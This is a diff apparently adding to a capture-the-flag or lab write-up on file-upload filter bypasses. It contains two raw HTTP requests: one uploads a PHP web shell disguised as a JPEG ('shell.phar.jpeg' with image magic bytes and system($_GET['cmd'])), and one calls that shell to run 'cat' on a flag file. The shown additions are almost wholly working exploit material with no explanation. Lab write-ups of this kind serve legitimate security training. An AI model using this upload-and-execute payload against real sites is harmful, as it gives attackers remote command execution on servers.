@@ -199,3 +199,38 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
 done
 ```
 
+```
+POST /contact/upload.php HTTP/1.1
+Host: 94.237.54.190:59897
+Content-Length: 234
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys1yno5vqOsmwB8bV
+Origin: http://94.237.54.190:59897
+Referer: http://94.237.54.190:59897/contact/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarys1yno5vqOsmwB8bV
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpeg"
+Content-Type: image/jpg
+
+ÿØÿà
+<?php system($_GET['cmd']);?>
+------WebKitFormBoundarys1yno5vqOsmwB8bV--
+```
+
+```
+GET /contact/user_feedback_submissions/250216_shell.phar.jpeg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt HTTP/1.1
+Host: 94.237.54.190:59897
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Origin: http://94.237.54.190:59897
+Referer: http://94.237.54.190:59897/contact/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
